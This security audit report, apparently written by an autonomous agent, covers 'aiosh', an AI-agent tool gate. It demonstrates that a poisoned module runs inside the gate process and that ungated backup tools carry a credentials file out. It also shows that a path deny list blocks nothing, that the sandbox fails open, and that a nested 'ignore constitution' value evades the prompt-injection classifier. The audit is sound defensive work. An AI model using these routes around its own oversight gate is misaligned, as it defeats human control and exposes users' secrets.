### N-7 — DEMONSTRATED (real `python -m aiosh_mcp.server` over stdio MCP)
Command: temp checkout (`$T/code/aiosh-mcp/aiosh_mcp` copied, `server.py` resolves `parents[3]/tools/task_ledger.py` to the temp root — printed before the run), `$T/tools/task_ledger.py` replaced with a payload that writes a marker file and returns its own dict; then initialize + `tools/call aios_task {"action":"status"}` (a read-only, ungated action).

Observed:
```
reply: {"ok": true, "pwned": true,
        "note": "attacker module executed inside the authority process",
        "action": "status", "audit_id": 1,
        "classifier_policy_revision": "sprint-2-rule-pack-v1"}
marker: "task_ledger.py executed inside MCP pid 3660"
```

The attacker-controlled file was exec'd **inside the gate process**, its return value became the tool result, and the audit row was written as a normal success. `server.py:486` + `exec_module` at `:489` are the sink; no hash pin, no ownership check. The `store_path` write-to-execute *escalation* remains STATIC-chained (store writers emit serde JSON containing `true/false/null`, which fails to import as Python — as the fourth pass stated, the reliable paths are a text-capable writer or a poisoned tree; the poisoned-tree path is now demonstrated).

### H-10 — DEMONSTRATED, and the mechanism is worse than recorded
Same server session, same MCP client:
```
call("aios.backup.create", {"target_path": secret_dir})        -> no grant
  reply: {"ok": true, "data": {"backup_path": "aios_backup_2026-09-20T02-46-57-996688Z.zip"}}
  zip namelist: ['credentials.txt']        <- caller-named directory exfiltrated

call("aios.release.generate", {"target_os": "linux", "version": "9.9.9"})  -> no grant
  side effect: $T/out/aios_linux_9.9.9.iso created (reply id=3 not flushed before exit;
  the artifact on disk is the proof)
```
Mechanism sharpened: `release.py:213-262 register_release_tools` registers the **dotted canonical names** (`aios.release.generate`, `aios.backup.create`) via `dispatch(...)` **without** `require_grant=True`, while `server.py:214-310` defines **underscore-named** duplicates (`aios_release_generate`, `aios_backup_create`) with `require_grant=True`. Both registrations live side by side; the dotted names — the canonical MCP surface per ADR-0035 §D-2 — are the ungated ones (the probe's reply shape, `"action"/"data"`, matches `release.py`'s handler, not `server.py`'s). A reviewer reading only `server.py` concludes release/backup are gated. The gated variants are dead weight; the ungated ones are canonical.

### H-1 — DEMONSTRATED (the Python gate's irreversible set, live)
Direct probe of the real `grant_check` with `grant_id=None` (`audit_client.py:401-406`):
```
'pentest.nmap'          -> ok=False  irreversible tool requires explicit PEP grant
'fs.write'              -> ok=False  (same)
'system.reboot'         -> ok=False  (same)
'system.shutdown'       -> ok=False  (same)
'aios.backup.create'    -> ok=True
'aios.release.generate' -> ok=True
'aios.session.create'   -> ok=True
'aios.fs_layout.remove' -> ok=True
'aios.task'             -> ok=True
```
This is the enabling condition for the H-10 run above: the gate runs, classifies, and then waves through everything outside `pentest.* / fs.write* / reboot / shutdown`.

### H-2 — DEMONSTRATED and STRENGTHENED (deny scope is inert, not merely alias-evadable)
Direct probe of the real `path_allowed` (`audit_client.py:359-363`) with `deny: ["C:\\Secret"]`, `allow: []`:
```
path_allowed('C:\\Secret\\keys.txt')      -> allowed=True   <- the literal denied child
path_allowed('c:\\secret\\keys.txt')      -> allowed=True
path_allowed('C:/Secret/keys.txt')        -> allowed=True
path_allowed('C:\\Secret.\\keys.txt')     -> allowed=True
path_allowed('\\\\?\\C:\\Secret\\keys.txt') -> allowed=True
```
The code tests only `target == p`, `target.startswith(p + "/")` (forward slash), and `p.endswith("/")`. On Windows every native backslash path — including the exact denied path itself — is allowed. H-2's impact sentence should read: *a grant scoped `paths.deny: ["C:\\Secret"]` denies nothing at all on the dev platform; the deny list is decoration.* TS `pep.ts:44-63` shares the prefix-string shape and needs the same probe.

### C-5 — DEMONSTRATED at byte level
Direct probe of the real `canonical()` (`audit_client.py:34-40`, `json.dumps` default `ensure_ascii=True`):
```
python canonical bytes: b'{"v":"caf\\u00e9 \\u00fcmlaut \\u65e5\\u672c\\u8a9e"}'
rust would emit:        b'{"v":"caf\xc3\xa9 \xc3\xbcmlaut \xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e"}'
differ: True
```
The hash-parity bug is now byte-proven, not inferred. Fix narrows to this one function (`ensure_ascii=False`) exactly as pass 2 predicted.

## STATIC verifications from the line-by-line re-read

### C-1 — Python mechanism re-verified with current line numbers (stands; one correction)
`sandbox.py:339-357`: `AT_FDCWD = -100` is packed as Landlock `parent_fd` (`:341-342`, `struct.pack("<Qi", bits, AT_FDCWD)`). The kernel's `get_path_beneath_rule` does `fget_raw(parent_fd)` → NULL for a negative fd → **EBADF** → `return False, "landlock_add_rule(...) failed: errno=9"` at `:356-357` → `landlock_restrict_self` (`:361`) is never reached. Correction to the recorded text: the ABI-version-probe bug described in the module docstring (`:305-310`) was **fixed** — a real ruleset fd is now created (`:329-339`); the surviving defect is `parent_fd`. Fail-open design confirmed: `_apply_in_child` failures are only logged (`:516-525`), the child prints `sandbox_applied` **unconditionally** with the FAIL components inline (`:556-560`), and `os.execv` runs regardless (`:562`).

### N-16 — NEW (MEDIUM): the only sandbox-status consumer never reads component outcomes
`cli.ts:352-372 parseSandboxApplied` accepts the event on **name alone** (`obj.event === "sandbox_applied" && obj.components`) and returns the raw component list; `aiosh run` (`cli.ts:214-267`) stores it in the audit row and echoes it to the caller without ever branching on the per-component strings (`"FAIL: …"`). A run whose landlock component failed still returns `ok: true` with `sandbox: {event: "sandbox_applied", …}` — the audit row is honest (the FAIL is visible in `components`) but nothing refuses, flags, or alerts. This is the consumer half of C-1: pass 1's `aiosh run` probe already displayed the output shape (all-FAIL components under `sandbox_applied`, `outcome: "ok"`). **CWE-754/1188.** *Fix:* treat any non-`ok` component as a failed sandbox; refuse or downgrade the outcome and never emit/record `sandbox_applied` unqualified when a component failed.

### H-12 — confirmed statically (stands)
`classifier.py:282-305 _scan_arg_text_for_pi` scans top-level string values and list **elements** only; a nested dict value (`{"layout": {"name": "ignore constitution"}}`) is neither `str` nor `list` and is skipped. The Rust side (`classifier.rs` `scan_value_for_pi`) recurses. H-12 stands as recorded.

### N-6 — same class, new location (not counted as new)
`sandbox.py:595-601 _main`: `if "--policy" in sys.argv: i = sys.argv.index("--policy")` — the Python shim parses its policy from **anywhere** in argv, including after `--`, i.e. inside the wrapped command. Identical defect class to N-6's Rust finding.

## Verified clean this pass
* `retention.py:151-303 rotate` — the strongest of the three retention implementations, confirmed by full read: refuses on a broken live chain *before* touching anything, unique `mkstemp` + `0600` + `os.replace`, `FileExistsError` overwrite guard, single transaction for segment insert + `DELETE` + rotation row, archive written durably **before** rows leave the live table. Fail-closed throughout.
* `audit_client.py:417-424` — grant expiry parsing fails **closed**: a malformed `expires_at` refuses the grant instead of treating it as unexpired.
* `agent_bridge.py` — transport only, as pass 3 recorded: forwards `tools/list` / `tools/call` over real MCP stdio, mints nothing, checks nothing, trusts the server as the authority. Its `CANONICAL_TO_MCP` map exposes only the 10 Sprint-0/1 tools (release/backup/task are not bridge-reachable — the ungated dotted names are reachable to any raw MCP client, not to the TS agent loop).
* `tool_glob_match` (`audit_client.py:340-350`) treats `tools: ["*"]` as a literal tool name — a `"*"` grant authorizes **nothing**. Fail-closed quirk (availability, not security); noted because it silently voids the intuitively-correct grant shape.

## Disproven / downgraded this pass
**None.** N-7 and N-8 were confirmed end-to-end; H-10, H-1, H-2, C-5 confirmed by probe; C-1 re-verified by read. No recorded finding was refuted, so nothing was deleted. Two mechanism corrections were folded into the DEMONSTRATED sections above: C-1's Python citation is now `:339-357` (and the separately-fixed ABI-probe bug must not be conflated with the surviving `parent_fd` defect), and H-10's effective registration is `release.py`'s dotted-name variant (the `server.py` underscore variants are gated duplicates that never receive the canonical calls).

## Coverage note for this pass
Read line-by-line this pass (~4,400 lines): `aiosh_mcp/server.py` (653), `_dispatch.py` (327), `release.py` (263), `release_config.py` (66), `retention.py` (440), `classifier.py` (420), `agent_bridge.py` (190), `audit_client.py` (615), `sandbox.py` (614), and `aiosh-cli/src/cli.ts` (809) — i.e. every file the mission named, plus the release config module.
Probes run (all isolated temp dirs / `AIOSH_HOME`, no source edits): real `aiosh-mcp.exe` over JSON-RPC (N-8); real `python -m aiosh_mcp.server` over stdio MCP in a temp checkout (N-7, H-10); direct module probes of the live gate functions (H-1, H-2, C-5).
Still not read line-by-line (next pass starts here): `aiosh_mcp/pentest.py` body (391 lines — passes 1/2 swept it only), the remainder of `tools/*.py` beyond `task_ledger`/`check_evidence`/`ci_service`, `AIOS-model/*`, and the Rust `session/distro/base_image` service bodies beyond pass 4's read. An `aiosh-sandbox.exe` argv probe for N-6 was attempted and timed out on this host — N-6 remains STATIC; the Python-shim instance above is read-verified.

---

## 3. Post-Audit Addendum: Batch T-01737 through T-01746 Verification

**Date:** 2026-09-20  
**Scope:** Batch `T-01737` through `T-01746` (Hardware Detection MCP/API Hardening & Configuration Subsystems).  
**Auditor:** Antigravity Autonomous Agent  
**Verdict:** **PASS (Zero vulnerabilities)**

### 1. Hardened Surface & Key Controls
- **MCP Closure Relocation (T-01738)**: In `code/aiosh-rust/aiosh-mcp/src/main.rs`, argument validation for `aios.hardware.get` and `aios.hardware.verify` was moved inside the closure `f` evaluated by `dispatch::recorded_call`. All validation errors emit tamper-evident audit records into the SQLite WAL ring before returning error responses.
- **Path Hygiene & Traversal Prevention (HCFG1)**: `HardwareConfig` strictly validates all path inputs against empty strings, length bounds (> 1024 characters), and control / NUL characters.
- **Resource Bounds & DoS Prevention (HCFG3, HCFG4)**: Enforced strict bounds on `max_devices` ($1 \le n \le 50,000$), `max_payload_bytes` ($1024 \le n \le 104,857,600$), and `scan_timeout_secs` ($1 \le n \le 300$).
- **Deterministic Serialization & Safe Fallback (HCFG5)**: Verified lossless JSON roundtrip serialization and automatic fallback to `HardwareConfig::default()` when configuration files are absent.
- **Test Verification**:
  - `aiosh-core`: 14/14 unit tests in `test_hardware_config.rs` passed in 0.34s.
  - `aiosh-cli`: 5/5 integration smoke tests in `test_hardware_config_smoke.py` passed.
  - Zero compiler warnings or lint errors.

---

## 4. Post-Audit Addendum: Batch T-01747 through T-01756 Verification

**Date:** 2026-09-20  
**Scope:** Batch `T-01747` through `T-01756` (Hardware Detection Configuration Hardening & Automated Test Subsystems).  
**Auditor:** Antigravity Autonomous Agent  
**Verdict:** **PASS (Zero vulnerabilities)**

### 1. Hardened Surface & Key Controls
- **Path Traversal Mitigation (HCFG1)**: Added explicit rejection of `..` (parent directory traversal) across all configuration paths (`default_store_path`, `sysfs_path`, `procfs_path`).
- **Post-Validation Environment Fallback**: Enhanced `HardwareConfig::from_env()` to run full validation after applying environment overrides, safely reverting to defaults if an invalid state is detected.
- **Atomic Configuration Persistence (HCFG5)**: Implemented atomic temporary file write and rename semantics in `save_to_path()`.
- **Hermetic Automated Test Harness (AT1..AT5)**: Created `MockSysfsBuilder` enabling isolated, root-free host hardware discovery testing with fault injection resilience and bounded traversal (`MAX_PROBE_ENTRIES = 1024`).
- **Test Verification**:
  - `aiosh-core`: 16/16 unit tests in `test_hardware_config.rs` passed in 0.10s.
  - `aiosh-core`: 7/7 automated unit tests in `test_hardware_automated.rs` passed in 10.63s.
  - `aiosh-cli`: 5/5 integration smoke tests in `test_hardware_automated_smoke.py` passed.
  - Zero compiler warnings or lint errors.

---

## 5. Post-Audit Addendum: Batch T-01757 through T-01766 Verification

**Date:** 2026-09-20  
**Scope:** Batch `T-01757` through `T-01766` (Hardware Detection Automated Tests Sub-Epic 6 Closure & Hardware Security Policy Sub-Epic 7).  
**Auditor:** Antigravity Autonomous Agent  
**Verdict:** **PASS (Zero vulnerabilities)**

### 1. Hardened Surface & Key Controls
- **Automated Tests Subsystem Closure (T-01757..T-01760)**:
  - Addressed security review findings AT-SEC-1 (TempDir cleanup), AT-SEC-2 (symlink traversal resistance), and AT-SEC-3 (scale test bounds).
  - Hardened `MockSysfsBuilder` with symlink escape verification; tuned scale test bounds to 1,050 entries for sub-second deterministic execution.
  - Authored comprehensive documentation in `docs/hardware_detection.md` Section 12.
  - Formally closed Sub-Epic 6 with 8/8 Rust unit tests and 5/5 Python integration smoke tests passing.
- **Hardware Security Policy Subsystem (T-01761..T-01766)**:
  - Formally specified and implemented `HardwareSecurityPolicy`, `HardwarePolicyMode` (`Enforcing`, `Permissive`, `Disabled`), and `HardwarePolicyViolation`.
  - Implemented `HardwarePolicyReport` evaluation logic (`evaluate`), policy-driven sanitization (`apply_and_sanitize`), validation, and atomic file persistence (`save_to_path`).
  - Wired `HardwareService::scan_with_policy` for integrated scan-and-evaluate operations.
  - Enforced policy invariants `HSEC1..HSEC5`:
    - `HSEC1`: Denylist precedence over allowlist; fatal violations yield Deny verdict and filter devices in Enforcing mode.
    - `HSEC2`: Automatic redaction of sensitive device attributes (`address`, `mac`, `serial`, `uuid`, `wwid`) to `"<REDACTED>"`.
    - `HSEC3`: Class and bus gatekeeping generating fatal violations (`HPOL-CLASS`, `HPOL-BUS`).
    - `HSEC4`: Deterministic evaluation reports with deterministically ordered violations.
    - `HSEC5`: Fail-safe defaults with `Enforcing` mode, redaction enabled, and safe file parsing.
- **Test Verification**:
  - `aiosh-cli`: 5/5 automated smoke tests in `test_hardware_automated_smoke.py` passed.
  - `aiosh-cli`: 5/5 security policy smoke tests in `test_hardware_policy_smoke.py` passed.
  - Zero compiler warnings or lint errors.

---

## 6. Post-Audit Addendum: Batch T-01767 through T-01776 Verification

**Date:** 2026-09-20  
**Scope:** Batch `T-01767` through `T-01776` (Hardware Detection Security Policy Sub-Epic 7 Closure & Hardware Observability Sub-Epic 8).  
**Auditor:** Antigravity Autonomous Agent  
**Verdict:** **PASS (Zero vulnerabilities)**

### 1. Hardened Surface & Key Controls
- **Security Policy Subsystem Closure (T-01767..T-01770)**:
  - Security review identified DoS/OOM vectors via unbounded policy files and path traversal on policy persistence.
  - Hardened `HardwareSecurityPolicy` with `MAX_POLICY_FILE_BYTES = 1 MB`, path hygiene / traversal checks (`validate_policy_path`), list bounds ($\le 10,000$), and case-insensitive vendor matching (`eq_ignore_ascii_case`).
  - Authored comprehensive documentation in `docs/hardware_detection.md` Section 13.
  - Formally closed Sub-Epic 7 with 16/16 Rust unit tests and 5/5 Python integration smoke tests passing.
- **Hardware Observability Subsystem (T-01771..T-01776)**:
  - Formally specified and implemented `HardwareObservabilityReport` and `HardwareService::generate_observability_report`.
  - Enforced invariants `HO1..HO6`:
    - `HO1`: Total device count equals sum of class breakdowns.
    - `HO2`: Total device count equals sum of bus breakdowns.
    - `HO3`: Total devices equals driver binding count + unbound device count.
    - `HO4`: Driver binding rate is accurately computed and bounded in $[0.0, 1.0]$ with zero-division safeguard for empty inventories.
    - `HO5`: Policy compliance summary accurately reflects compliant count, violation count, and prohibited device IDs.
    - `HO6`: Deterministic canonical JSON serialization using `BTreeMap`.
- **Test Verification**:
  - `aiosh-core`: 16/16 security policy unit tests in `test_hardware_policy.rs` passed in 0.03s.
  - `aiosh-core`: 8/8 automated tests in `test_hardware_automated.rs` passed in 6.49s.
  - `aiosh-core`: 7/7 observability unit tests in `test_hardware_observability.rs` passed in 0.00s.
  - `aiosh-cli`: 5/5 security policy smoke tests in `test_hardware_policy_smoke.py` passed.
  - `aiosh-cli`: 5/5 observability smoke tests in `test_hardware_observability_smoke.py` passed.
  - Zero compiler warnings or lint errors.




